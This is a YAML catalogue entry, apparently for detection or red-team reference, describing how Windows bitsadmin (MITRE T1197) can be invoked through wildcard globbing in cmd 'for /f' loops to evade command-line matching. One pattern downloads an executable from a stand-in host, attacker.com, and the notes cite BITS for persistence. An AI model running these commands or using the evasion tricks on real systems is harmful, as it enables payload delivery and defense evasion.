---
Name: bitsadmin
Description: "Background Intelligent Transfer Service admin tool. Can download or upload files using BITS jobs, bypassing some network controls."
Platform: windows-cmd
BinaryPath:
  - C:\Windows\System32\bitsadmin.exe
Category: download
MitreID: T1197
Patterns:
  - Pattern: "for /f %i in ('where bits*.exe') do %i /transfer job /download /priority normal http://attacker.com/p.exe C:\\p.exe"
    Wildcards: ["*"]
    Notes: "Star matches 'admin' after 'bits'"
  - Pattern: "for /f %i in ('where b*admin.exe') do %i"
    Wildcards: ["*"]
    Notes: "Star replaces 'its'"
  - Pattern: "for /f %i in ('where bitsad?in.exe') do %i"
    Wildcards: ["?"]
    Notes: "Single char wildcard replaces 'm'"
  - Pattern: "for /f %i in ('dir /b C:\\Windows\\System32\\bits*.exe') do %i"
    Wildcards: ["*"]
    Notes: "dir /b with glob pattern"
PlatformNotes: |
  CMD glob evasion requires the `for /f` + `where` pattern. BITS jobs persist across reboots by default, making bitsadmin useful for persistence too.
Resources:
  - https://attack.mitre.org/techniques/T1197/
  - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/
---
